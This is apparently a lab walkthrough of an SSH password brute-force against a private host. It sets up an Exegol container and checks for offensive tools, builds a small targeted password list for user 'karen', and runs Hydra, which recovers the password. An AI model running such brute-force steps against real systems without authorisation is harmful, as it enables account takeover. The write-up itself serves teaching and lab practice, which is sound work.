## Attack Preparation

### Connectivity Validation

```bash
ping -c 4 10.10.6.3

nc -zv 10.10.6.3 22
```

Expected result:

```text
22/tcp open ssh
```

---

### Exegol Deployment

Install image:

```bash
exegol install free
```

Create container:

```bash
exegol start darkforest free
```

Open shell:

```bash
exegol shell darkforest
```

Verify tooling:

```bash
which hydra
which nmap
which netexec
which bloodhound-python
```

---

### Password Dictionary

Create test dictionary:

```bash
cat > passwords.txt
```

Content:

```text
password
admin
root
karen
Welcome1
Password123
Emma2008!
Emma
Jean
2008
1998
Jean1998/
```

Verification:

```bash
cat passwords.txt
```

---

## Attack Execution

Launch Hydra against the SSH service:

```bash
hydra -l karen -P passwords.txt ssh://10.10.6.3
```

Result:

```text
[22][ssh] host: 10.10.6.3
login: karen
password: Emma2008!
```

A valid credential was successfully identified.

